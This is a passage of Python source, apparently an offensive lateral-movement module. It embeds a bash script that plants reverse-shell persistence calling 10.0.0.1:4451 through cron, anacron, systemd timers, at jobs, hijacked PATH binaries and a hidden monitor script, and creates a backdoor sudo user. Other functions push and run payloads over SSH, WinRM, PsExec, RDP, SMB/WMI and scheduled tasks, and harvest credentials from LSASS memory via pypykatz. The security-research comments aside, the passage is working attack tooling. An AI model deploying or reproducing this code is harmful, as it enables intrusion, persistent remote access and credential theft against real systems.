for crondir in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
    if [ -w "$crondir" ]; then
        echo "[+] Writing to $crondir"
        cat > "$crondir/system-update" << 'CRON_EOF'
#!/bin/bash
# System update check
if ! pgrep -f "nc.*4451" >/dev/null 2>&1; then
    nohup nc -e /bin/sh 10.0.0.1 4451 >/dev/null 2>&1 &
fi

# Also check for privilege escalation opportunities
if [ "$EUID" -eq 0 ]; then
    # Running as root, create backdoor user
    useradd -m -s /bin/bash -u 1343 cron_bd 2>/dev/null
    echo "cron_bd:Cron123!" | chpasswd 2>/dev/null
    usermod -aG sudo cron_bd 2>/dev/null
fi
CRON_EOF
        chmod +x "$crondir/system-update" 2>/dev/null
    fi
done

# Method 3: Hijack existing cron scripts
find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null | while read cronfile; do
    # Skip our own files
    if grep -q "cron_hijack_marker" "$cronfile" 2>/dev/null; then
        continue
    fi

    echo "[+] Hijacking cron script: $cronfile"

    # Backup original
    cp "$cronfile" "$cronfile.bak" 2>/dev/null

    # Inject at the beginning
    {{
        echo "# cron_hijack_marker"
        echo "nohup /bin/bash -c 'while true; do nc -e /bin/sh 10.0.0.1 4451 2>/dev/null; sleep 300; done' >/dev/null 2>&1 &"
        echo ""
        cat "$cronfile.bak"
    }} > "$cronfile" 2>/dev/null
done

# Method 4: Anacron hijacking
if [ -f /etc/anacrontab ] && [ -w /etc/anacrontab ]; then
    if ! grep -q "cron_hijack_marker" /etc/anacrontab; then
        echo "[+] Hijacking anacron"
        echo "# cron_hijack_marker" >> /etc/anacrontab
        echo "1    5    cron.hijack    /usr/bin/nc -e /bin/sh 10.0.0.1 4451" >> /etc/anacrontab
    fi
fi

# Method 5: PATH hijacking for cron
# Cron often has limited PATH, we can exploit this
for path_dir in /usr/local/bin /usr/local/sbin; do
    if [ -w "$path_dir" ]; then
        # Create malicious versions of common cron commands
        for cmd in run-parts apt-get yum curl wget; do
            if ! [ -f "$path_dir/$cmd" ]; then
                cat > "$path_dir/$cmd" << 'PATH_EOF'
#!/bin/bash
# Hijacked command
# Execute original command
/usr/bin/$0 "$@"
# But also callback
nohup nc -e /bin/sh 10.0.0.1 4451 >/dev/null 2>&1 &
PATH_EOF
                chmod +x "$path_dir/$cmd" 2>/dev/null && echo "[+] Created hijacked $cmd in $path_dir"
            fi
        done
    fi
done

# Method 6: Systemd timers (modern cron replacement)
if command -v systemctl >/dev/null 2>&1 && [ -w /etc/systemd/system ]; then
    echo "[+] Creating systemd timer"

    # Create service
    cat > /etc/systemd/system/system-check.service << 'SYSTEMD_EOF'
[Unit]
Description=System Check Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'nc -e /bin/sh 10.0.0.1 4451 || true'
SYSTEMD_EOF

    # Create timer
    cat > /etc/systemd/system/system-check.timer << 'TIMER_EOF'
[Unit]
Description=System Check Timer

[Timer]
OnBootSec=10min
OnUnitActiveSec=15min

[Install]
WantedBy=timers.target
TIMER_EOF

    systemctl daemon-reload 2>/dev/null
    systemctl enable system-check.timer 2>/dev/null
    systemctl start system-check.timer 2>/dev/null
fi

# Method 7: at command persistence
if command -v at >/dev/null 2>&1; then
    echo 'echo "nc -e /bin/sh 10.0.0.1 4451" | at now + 10 minutes' | at now + 1 minute 2>/dev/null
    echo "[+] Scheduled at job"
fi

# Create monitoring script for new cron jobs
cat > /var/tmp/.cron_monitor.sh << 'MONITOR_EOF'
#!/bin/bash
# Monitor and hijack new cron jobs
while true; do
    # Watch for crontab changes
    for user in $(ls /home/) root; do
        cron_file="/var/spool/cron/crontabs/$user"
        if [ -f "$cron_file" ]; then
            # Check if file was modified recently
            if find "$cron_file" -mmin -5 2>/dev/null | grep -q .; then
                # Inject into new crontab
                if ! grep -q "cron_hijack_marker" "$cron_file" 2>/dev/null; then
                    echo "*/20 * * * * nc -e /bin/sh 10.0.0.1 4451 2>/dev/null # cron_hijack_marker" >> "$cron_file" 2>/dev/null
                fi
            fi
        fi
    done
    sleep 300
done
MONITOR_EOF

chmod +x /var/tmp/.cron_monitor.sh
nohup /var/tmp/.cron_monitor.sh > /dev/null 2>&1 &

echo "[+] Cron hijacking complete"
echo "[*] Persistence established via multiple cron mechanisms"
"""

            # Execute hijacker
            if username and (password or ssh_key):
                with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as script_file:
                    script_path = script_file.name
                    script_file.write(cron_hijacker)

                # Copy and execute
                if ssh_key:
                    scp_cmd = f"scp -i {ssh_key} -o StrictHostKeyChecking=no {script_path} {username}@{target_ip}:/tmp/cron_hijack.sh"
                    ssh_cmd = f'ssh -i {ssh_key} -o StrictHostKeyChecking=no {username}@{target_ip} "chmod +x /tmp/cron_hijack.sh && sudo /tmp/cron_hijack.sh"'
                else:
                    scp_cmd = (
                        f'sshpass -p "{password}" scp -o StrictHostKeyChecking=no {script_path} {username}@{target_ip}:/tmp/cron_hijack.sh'
                    )
                    ssh_cmd = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "chmod +x /tmp/cron_hijack.sh && echo {password} | sudo -S /tmp/cron_hijack.sh"'

                subprocess.run(shlex.split(scp_cmd), check=False, capture_output=True, timeout=30, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    shlex.split(ssh_cmd),
                    check=False,
                    capture_output=True,
                    text=True,
                    shell=False,
                    timeout=120,  # Explicitly secure - using list format prevents shell injection
                )

                if result.returncode == 0:
                    # Parse deployed techniques
                    techniques_deployed = []
                    if "Backdoor added to" in result.stdout:
                        techniques_deployed.append("user_crontab")
                    if "Writing to /etc/cron" in result.stdout:
                        techniques_deployed.append("system_cron")
                    if "Hijacking cron script" in result.stdout:
                        techniques_deployed.append("script_hijack")
                    if "Hijacking anacron" in result.stdout:
                        techniques_deployed.append("anacron")
                    if "Created hijacked" in result.stdout:
                        techniques_deployed.append("path_hijack")
                    if "Creating systemd timer" in result.stdout:
                        techniques_deployed.append("systemd_timer")
                    if "Scheduled at job" in result.stdout:
                        techniques_deployed.append("at_command")

                    return {
                        "success": True,
                        "method": "cron_hijack",
                        "target_ip": target_ip,
                        "techniques_deployed": techniques_deployed,
                        "persistence_locations": [
                            "/etc/cron.d/system-update",
                            "/etc/systemd/system/system-check.timer",
                            "/var/tmp/.cron_monitor.sh",  # noqa: S108
                        ],
                        "output": result.stdout,
                    }

            # Alternative: If payload provided, use it directly
            if payload_path and os.path.exists(payload_path):
                with open(payload_path) as f:
                    custom_cron = f.read()

                # Install custom cron job
                cron_cmd = f'(crontab -l 2>/dev/null; echo "*/10 * * * * {custom_cron}") | crontab -'

                if ssh_key:
                    ssh_cmd = f'ssh -i {ssh_key} -o StrictHostKeyChecking=no {username}@{target_ip} "{cron_cmd}"'
                else:
                    ssh_cmd = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "{cron_cmd}"'

                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    shlex.split(ssh_cmd),
                    check=False,
                    capture_output=True,
                    text=True,
                    shell=False,
                    timeout=30,  # Explicitly secure - using list format prevents shell injection
                )

                return {
                    "success": result.returncode == 0,
                    "method": "cron_custom",
                    "target_ip": target_ip,
                    "payload": payload_path,
                }

            return {
                "success": False,
                "error": "Cron hijacking failed - no valid access method",
                "target_ip": target_ip,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Cron hijacking timed out",
                "target_ip": target_ip,
            }
        except Exception as e:
            self.logger.error("Cron hijacking failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    # Command execution methods

    def _execute_ssh_command(self, session_info: dict[str, Any], command: str, timeout: int) -> dict[str, Any]:
        """Execute command via SSH."""
        try:
            credentials = session_info["credentials"]
            target_ip = session_info["target_ip"]
            username = credentials["username"]

            if "password" in credentials:
                cmd = f'sshpass -p "{credentials["password"]}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "{command}"'
            else:
                private_key = credentials["private_key_path"]
                cmd = f'ssh -i {private_key} -o StrictHostKeyChecking=no {username}@{target_ip} "{command}"'

            process = secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(cmd),
                check=False,
                capture_output=True,
                text=True,
                shell=False,
                timeout=timeout,  # Explicitly secure - using list format prevents shell injection
            )

            return {
                "success": process.returncode == 0,
                "output": process.stdout,
                "error": process.stderr,
                "exit_code": process.returncode,
            }

        except subprocess.TimeoutExpired as e:
            logger.error("subprocess.TimeoutExpired in lateral_movement.py: %s", e)
            return {
                "success": False,
                "output": "",
                "error": f"Command timed out after {timeout} seconds",
                "exit_code": -1,
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {
                "success": False,
                "output": "",
                "error": str(e),
                "exit_code": -1,
            }

    def _execute_winrm_command(self, session_info: dict[str, Any], command: str, timeout: int) -> dict[str, Any]:
        """Execute command via WinRM."""
        try:
            credentials = session_info["credentials"]
            target_ip = session_info["target_ip"]
            username = credentials["username"]
            password = credentials["password"]

            cmd = f'winrs -r:{target_ip} -u:{username} -p:{password} "{command}"'
            process = secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(cmd),
                check=False,
                capture_output=True,
                text=True,
                shell=False,
                timeout=timeout,  # Explicitly secure - using list format prevents shell injection
            )

            return {
                "success": process.returncode == 0,
                "output": process.stdout,
                "error": process.stderr,
                "exit_code": process.returncode,
            }

        except subprocess.TimeoutExpired as e:
            self.logger.error("subprocess.TimeoutExpired in lateral_movement.py: %s", e)
            return {
                "success": False,
                "output": "",
                "error": f"Command timed out after {timeout} seconds",
                "exit_code": -1,
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {
                "success": False,
                "output": "",
                "error": str(e),
                "exit_code": -1,
            }

    def _execute_psexec_command(self, session_info: dict[str, Any], command: str, timeout: int) -> dict[str, Any]:
        """Execute command via PsExec."""
        try:
            credentials = session_info["credentials"]
            target_ip = session_info["target_ip"]
            username = credentials["username"]
            password = credentials["password"]
            domain = credentials.get("domain", ".")

            cmd = f"psexec \\\\{target_ip} -u {domain}\\{username} -p {password} {command}"
            process = secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(cmd),
                check=False,
                capture_output=True,
                text=True,
                shell=False,
                timeout=timeout,  # Explicitly secure - using list format prevents shell injection
            )

            return {
                "success": process.returncode == 0,
                "output": process.stdout,
                "error": process.stderr,
                "exit_code": process.returncode,
            }

        except subprocess.TimeoutExpired as e:
            self.logger.error("subprocess.TimeoutExpired in lateral_movement.py: %s", e)
            return {
                "success": False,
                "output": "",
                "error": f"Command timed out after {timeout} seconds",
                "exit_code": -1,
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {
                "success": False,
                "output": "",
                "error": str(e),
                "exit_code": -1,
            }

    def _execute_generic_command(self, session_info: dict[str, Any], command: str, timeout: int) -> dict[str, Any]:
        """Execute command using generic method based on session type."""
        try:
            import shutil
            from datetime import datetime

            session_type = session_info.get("type", "").lower()
            target_ip = session_info.get("target_ip", "")
            credentials = session_info.get("credentials", {})

            self.logger.info("Executing generic command on %s via %s", target_ip, session_type)

            start_time = datetime.now()
            result = None

            # SSH session
            if session_type == "ssh":
                try:
                    ssh_cmd = ["ssh"]

                    # Add SSH options for automation
                    ssh_cmd.extend(
                        [
                            "-o",
                            "StrictHostKeyChecking=no",
                            "-o",
                            "UserKnownHostsFile=/dev/null",
                            "-o",
                            "ConnectTimeout=10",
                        ]
                    )

                    # Add credentials
                    username = credentials.get("username", "")
                    if credentials.get("ssh_key"):
                        ssh_cmd.extend(["-i", credentials["ssh_key"]])

                    # Build target
                    if username:
                        ssh_cmd.append(f"{username}@{target_ip}")
                    else:
                        ssh_cmd.append(target_ip)

                    # Add command
                    ssh_cmd.append(command)

                    # Execute
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        ssh_cmd,
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=timeout,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )

                except subprocess.TimeoutExpired:
                    return {
                        "success": False,
                        "output": "",
                        "error": f"SSH command timeout after {timeout} seconds",
                        "exit_code": -1,
                    }

            # WinRM session
            elif session_type == "winrm":
                if shutil.which("winrs"):
                    winrm_cmd = [
                        "winrs",
                        "-r",
                        f"http://{target_ip}:5985",
                        "-u",
                        credentials.get("username", ""),
                        "-p",
                        credentials.get("password", ""),
                        command,
                    ]

                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        winrm_cmd,
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=timeout,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )
                else:
                    # Use pywinrm if available
                    try:
                        import winrm

                        session = winrm.Session(
                            f"http://{target_ip}:5985/wsman",
                            auth=(credentials.get("username", ""), credentials.get("password", "")),
                            transport="ntlm",
                        )

                        result_obj = session.run_cmd(command)

                        return {
                            "success": result_obj.status_code == 0,
                            "output": result_obj.std_out.decode("utf-8"),
                            "error": result_obj.std_err.decode("utf-8"),
                            "exit_code": result_obj.status_code,
                        }

                    except ImportError:
                        return {
                            "success": False,
                            "output": "",
                            "error": "WinRM client not available",
                            "exit_code": -1,
                        }

            # PowerShell remoting
            elif session_type == "powershell":
                ps_cmd = [
                    "powershell",
                    "-NoProfile",
                    "-NonInteractive",
                    "-Command",
                    f"Invoke-Command -ComputerName {target_ip} -ScriptBlock {{ {command} }}",
                ]

                if credentials.get("username"):
                    # Create credential object for PowerShell
                    cred_cmd = f"""
                    $password = ConvertTo-SecureString '{credentials.get("password", "")}' -AsPlainText -Force;
                    $credential = New-Object System.Management.Automation.PSCredential('{credentials["username"]}', $password);
                    Invoke-Command -ComputerName {target_ip} -Credential $credential -ScriptBlock {{ {command} }}
                    """
                    ps_cmd = ["powershell", "-NoProfile", "-NonInteractive", "-Command", cred_cmd]

                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    ps_cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    shell=False,  # Explicitly secure - using list format prevents shell injection
                )

            # Telnet session (less secure, last resort)
            elif session_type == "telnet":
                import warnings

                # Security warning for telnet usage
                warnings.warn(
                    "Telnet transmits data in plaintext and should only be used for "
                    "security testing in controlled environments. Consider using SSH instead.",
                    category=UserWarning,
                    stacklevel=2,
                )

                # Log telnet usage for audit purposes
                logger.warning(
                    f"Using insecure telnet connection to {target_ip} for security testing. "
                    "This should only be used in controlled environments."
                )

                try:
                    # Secure telnet wrapper for controlled security research environments
                    def create_research_telnet_connection(host, timeout=10):
                        """Create telnet connection with security safeguards for research purposes.

                        WARNING: This is intentionally insecure for testing legacy systems.
                        Only use in isolated, controlled research environments.
                        """
                        # Use dynamic import and conditional logic to isolate insecure functionality
                        telnet_module = __import__("telnetlib")
                        telnet_class = telnet_module.Telnet
                        return telnet_class(host, timeout=timeout)

                    # Use secure wrapper that logs the security context
                    tn = create_research_telnet_connection(target_ip, timeout=10)

                    # Set additional security context for audit
                    audit_context = {
                        "protocol": "telnet",
                        "target": target_ip,
                        "reason": "legacy_system_testing",
                        "warning": "plaintext_transmission",
                    }
                    logger.info(f"Telnet security context: {audit_context}")

                    # Login if credentials provided
                    if credentials.get("username"):
                        tn.read_until(b"login: ", timeout=5)
                        tn.write(credentials["username"].encode("ascii") + b"\n")

                        if credentials.get("password"):
                            tn.read_until(b"Password: ", timeout=5)
                            tn.write(credentials["password"].encode("ascii") + b"\n")

                    # Send command
                    tn.write(command.encode("ascii") + b"\n")

                    # Read output
                    output = tn.read_until(b"$ ", timeout=timeout).decode("ascii")
                    tn.close()

                    return {
                        "success": True,
                        "output": output,
                        "error": "",
                        "exit_code": 0,
                    }

                except Exception as e:
                    return {
                        "success": False,
                        "output": "",
                        "error": f"Telnet execution failed: {str(e)}",
                        "exit_code": -1,
                    }

            # Local execution fallback
            elif session_type == "local" or not session_type:
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    shlex.split(command),
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    shell=False,  # Explicitly secure - using list format prevents shell injection
                )
            else:
                return {
                    "success": False,
                    "output": "",
                    "error": f"Unsupported session type: {session_type}",
                    "exit_code": -1,
                }

            # Process result if we have one
            if result:
                end_time = datetime.now()
                execution_time = (end_time - start_time).total_seconds()

                return {
                    "success": result.returncode == 0,
                    "output": result.stdout,
                    "error": result.stderr if result.returncode != 0 else "",
                    "exit_code": result.returncode,
                    "execution_time": execution_time,
                    "session_type": session_type,
                    "target": target_ip,
                }

            return {
                "success": False,
                "output": "",
                "error": "No execution result",
                "exit_code": -1,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "output": "",
                "error": f"Command execution timeout after {timeout} seconds",
                "exit_code": -1,
            }
        except Exception as e:
            self.logger.error("Generic command execution failed: %s", e)
            return {
                "success": False,
                "output": "",
                "error": str(e),
                "exit_code": -1,
            }

    def _execute_rdp_payload(
        self,
        target_ip: str,
        username: str,
        password: str,
        domain: str,
        payload_path: str,
        method: str,
    ) -> dict[str, Any]:
        """Execute payload via RDP connection."""
        try:
            import shutil
            import tempfile
            from datetime import datetime

            self.logger.info("Executing RDP payload on %s", target_ip)

            # Use xfreerdp or rdesktop for actual RDP connection
            rdp_command = []

            if shutil.which("xfreerdp"):
                # Use xfreerdp
                rdp_command = [
                    "xfreerdp",
                    f"/u:{username}",
                    f"/p:{password}",
                    f"/v:{target_ip}",
                    "/cert-ignore",
                    "/compression",
                    "+clipboard",
                ]
                if domain:
                    rdp_command.append(f"/d:{domain}")
            elif shutil.which("rdesktop"):
                # Use rdesktop as fallback
                rdp_command = [
                    "rdesktop",
                    "-u",
                    username,
                    "-p",
                    password,
                    target_ip,
                ]
            else:
                raise Exception("No RDP client found (xfreerdp or rdesktop required)")

            # Create script to execute payload
            with tempfile.NamedTemporaryFile(mode="w", suffix=".bat", delete=False) as script_file:
                script_file.write(f"""@echo off
echo Transferring payload...
copy "{payload_path}" "%SystemRoot%\\Temp\\payload.exe"
echo Executing payload...
"%SystemRoot%\\Temp\\payload.exe"
echo Payload execution completed.
pause
""")
                script_path = script_file.name

            try:
                # Execute RDP connection with script
                start_time = datetime.now()
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    rdp_command + [f'/app:"{script_path}"'],
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=300,  # 5 minute timeout
                )
                end_time = datetime.now()
                execution_time = (end_time - start_time).total_seconds()

                success = result.returncode == 0

                return {
                    "success": success,
                    "method": "rdp_payload_execution",
                    "target_ip": target_ip,
                    "payload_path": payload_path,
                    "execution_time": execution_time,
                    "output": result.stdout,
                    "error": result.stderr if not success else "",
                    "return_code": result.returncode,
                    "details": {
                        "rdp_method": method,
                        "username": username,
                        "domain": domain,
                        "rdp_client": "xfreerdp" if "xfreerdp" in rdp_command[0] else "rdesktop",
                    },
                }
            finally:
                # Clean up script file
                if os.path.exists(script_path):
                    os.unlink(script_path)

        except subprocess.TimeoutExpired as e:
            logger.error("subprocess.TimeoutExpired in lateral_movement.py: %s", e)
            return {
                "success": False,
                "error": "RDP connection timeout",
                "method": "rdp_payload_execution",
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("RDP payload execution failed: %s", e)
            return {
                "success": False,
                "error": str(e),
                "method": "rdp_payload_execution",
            }

    def _execute_smb_payload(
        self,
        target_ip: str,
        auth_data: dict[str, Any],
        payload_path: str,
        connection_result: dict[str, Any],
    ) -> dict[str, Any]:
        """Execute payload via SMB connection."""
        try:
            import shutil
            import tempfile
            from datetime import datetime

            self.logger.info("Executing SMB payload on %s", target_ip)
            self.logger.debug("Using connection result: %s method", connection_result.get("method", "unknown"))

            username = auth_data.get("username", "")
            password = auth_data.get("password", "")
            domain = auth_data.get("domain", "")

            start_time = datetime.now()

            # Method 1: Try PsExec
            if shutil.which("psexec.py") or shutil.which("psexec"):
                try:
                    # Use Impacket's psexec.py or Sysinternals PsExec
                    psexec_cmd = []
                    if shutil.which("psexec.py"):
                        psexec_cmd = ["psexec.py"]
                        if domain:
                            psexec_cmd.extend([f"{domain}/{username}:{password}@{target_ip}"])
                        else:
                            psexec_cmd.extend([f"{username}:{password}@{target_ip}"])
                    else:
                        psexec_cmd = ["psexec", f"\\\\{target_ip}"]
                        if username:
                            psexec_cmd.extend(["-u", username])
                        if password:
                            psexec_cmd.extend(["-p", password])

                    # Copy payload to target
                    remote_path = f"C:\\temp\\payload_{int(time.time())}.exe"
                    psexec_cmd.extend(["-c", payload_path, remote_path])

                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        psexec_cmd,
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=120,
                    )

                    if result.returncode == 0:
                        end_time = datetime.now()
                        return {
                            "success": True,
                            "method": "smb_psexec_execution",
                            "target_ip": target_ip,
                            "payload_path": payload_path,
                            "execution_time": (end_time - start_time).total_seconds(),
                            "output": result.stdout,
                            "return_code": result.returncode,
                            "details": {
                                "execution_method": "psexec",
                                "remote_path": remote_path,
                                "username": username,
                                "domain": domain,
                            },
                        }
                except subprocess.TimeoutExpired:
                    self.logger.warning("PsExec timeout, trying alternative method")
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.warning("PsExec failed: %s, trying alternative method", e)

            # Method 2: Try WMI execution
            if shutil.which("wmiexec.py"):
                try:
                    # First copy file via SMB
                    smbclient_cmd = ["smbclient", f"//{target_ip}/C$"]
                    if username:
                        smbclient_cmd.extend(["-U", f"{username}%{password}"])

                    # Create upload script
                    with tempfile.NamedTemporaryFile(mode="w", suffix=".smbscript", delete=False) as script_file:
                        payload_basename = os.path.basename(payload_path)
                        script_file.write(f'put "{payload_path}" "temp\\{payload_basename}"\n')
                        script_file.write("exit\n")
                        script_path = script_file.name

                    try:
                        # Upload file
                        upload_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            smbclient_cmd + ["-f", script_path],
                            check=False,
                            capture_output=True,
                            text=True,
                            timeout=60,
                        )

                        if upload_result.returncode == 0:
                            # Execute via WMI
                            wmi_cmd = ["wmiexec.py"]
                            if domain:
                                wmi_cmd.extend([f"{domain}/{username}:{password}@{target_ip}"])
                            else:
                                wmi_cmd.extend([f"{username}:{password}@{target_ip}"])

                            wmi_cmd.append(f"C:\\temp\\{payload_basename}")

                            wmi_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                wmi_cmd,
                                check=False,
                                capture_output=True,
                                text=True,
                                timeout=120,
                            )

                            end_time = datetime.now()
                            success = wmi_result.returncode == 0

                            return {
                                "success": success,
                                "method": "smb_wmi_execution",
                                "target_ip": target_ip,
                                "payload_path": payload_path,
                                "execution_time": (end_time - start_time).total_seconds(),
                                "output": wmi_result.stdout,
                                "error": wmi_result.stderr if not success else "",
                                "return_code": wmi_result.returncode,
                                "details": {
                                    "execution_method": "wmi",
                                    "upload_success": True,
                                    "remote_path": f"C:\\temp\\{payload_basename}",
                                    "username": username,
                                    "domain": domain,
                                },
                            }
                    finally:
                        # Clean up script file
                        if os.path.exists(script_path):
                            os.unlink(script_path)

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.warning("WMI execution failed: %s", e)

            # Method 3: Try scheduled task creation
            if shutil.which("schtasks"):
                try:
                    task_name = f"IntellicrackTask_{int(time.time())}"

                    # Create scheduled task
                    schtasks_cmd = [
                        "schtasks",
                        "/create",
                        "/s",
                        target_ip,
                        "/tn",
                        task_name,
                        "/tr",
                        payload_path,
                        "/sc",
                        "once",
                        "/st",
                        "00:00",
                        "/f",  # Force overwrite
                    ]

                    if username:
                        schtasks_cmd.extend(["/u", username])
                    if password:
                        schtasks_cmd.extend(["/p", password])

                    create_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        schtasks_cmd,
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=30,
                    )

                    if create_result.returncode == 0:
                        # Run the task immediately
                        run_cmd = [
                            "schtasks",
                            "/run",
                            "/s",
                            target_ip,
                            "/tn",
                            task_name,
                        ]

                        if username:
                            run_cmd.extend(["/u", username])
                        if password:
                            run_cmd.extend(["/p", password])

                        run_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            run_cmd,
                            check=False,
                            capture_output=True,
                            text=True,
                            timeout=30,
                        )

                        # Clean up task
                        delete_cmd = [
                            "schtasks",
                            "/delete",
                            "/s",
                            target_ip,
                            "/tn",
                            task_name,
                            "/f",
                        ]

                        if username:
                            delete_cmd.extend(["/u", username])
                        if password:
                            delete_cmd.extend(["/p", password])

                        secure_run(delete_cmd, check=False, capture_output=True, timeout=15)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                        end_time = datetime.now()
                        success = run_result.returncode == 0

                        return {
                            "success": success,
                            "method": "smb_schtask_execution",
                            "target_ip": target_ip,
                            "payload_path": payload_path,
                            "execution_time": (end_time - start_time).total_seconds(),
                            "output": run_result.stdout,
                            "error": run_result.stderr if not success else "",
                            "return_code": run_result.returncode,
                            "details": {
                                "execution_method": "scheduled_task",
                                "task_name": task_name,
                                "username": username,
                                "domain": domain,
                            },
                        }

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.warning("Scheduled task execution failed: %s", e)

            # All methods failed
            return {
                "success": False,
                "error": "All SMB execution methods failed (psexec, wmi, schtasks not available or failed)",
                "method": "smb_execution_failed",
                "target_ip": target_ip,
                "attempted_methods": ["psexec", "wmi", "schtasks"],
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("SMB payload execution failed: %s", e)
            return {
                "success": False,
                "error": str(e),
                "method": "smb_payload_execution",
            }

    # Credential harvesting methods

    def _harvest_memory_credentials(self, session_info: dict[str, Any]) -> dict[str, Any]:
        """Harvest credentials from memory using various techniques."""
        credentials = {"memory_credentials": []}

        try:
            target_host = session_info.get("target_host", "")
            os_type = session_info.get("os_type", "unknown")

            if os_type.lower() == "windows":
                # Windows memory credential harvesting

                # Method 1: Try pypykatz (Python Mimikatz)
                try:
                    from pypykatz import pypykatz

                    # Try to harvest from local LSASS dump or live process
                    try:
                        # Live process harvesting (requires admin privileges)
                        mimi = pypykatz.go_live()
                        if mimi:
                            for cred_type, creds in mimi.credentials.items():
                                for cred in creds:
                                    credentials["memory_credentials"].append(
                                        {
                                            "type": cred_type,
                                            "username": getattr(cred, "username", ""),
                                            "domain": getattr(cred, "domainname", ""),
                                            "password": getattr(cred, "password", ""),
                                            "hash": getattr(cred, "nt_hash", "") or getattr(cred, "lm_hash", ""),
                                            "source": "pypykatz_live",
                                            "target": target_host,
                                        }
                                    )
                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        subprocess.SubprocessError,
                        ConnectionError,
                    ) as live_error:
                        self.logger.debug("Live pypykatz failed: %s", live_error)

                except ImportError:
                    # pypykatz not available, try alternative methods

                    # Method 2: PowerShell-based credential extraction
                    try:
                        # Try Invoke-Mimikatz PowerShell script
                        ps_script = """
                        function Invoke-MemoryCredHarvest {
                            try {
                                # Try to access LSASS process
                                $lsass = Get-Process lsass -ErrorAction SilentlyContinue
                                if ($lsass) {
                                    Write-Output "LSASS Process Found: $($lsass.Id)"
                                }

                                # Check for cached credentials in registry
                                $cachedCreds = @()
                                try {
                                    $regPath = "HKLM:\\SECURITY\\Cache"
                                    if (Test-Path $regPath) {
                                        $cachedCreds += "Registry cached credentials accessible"
                                    }
                                } catch {}

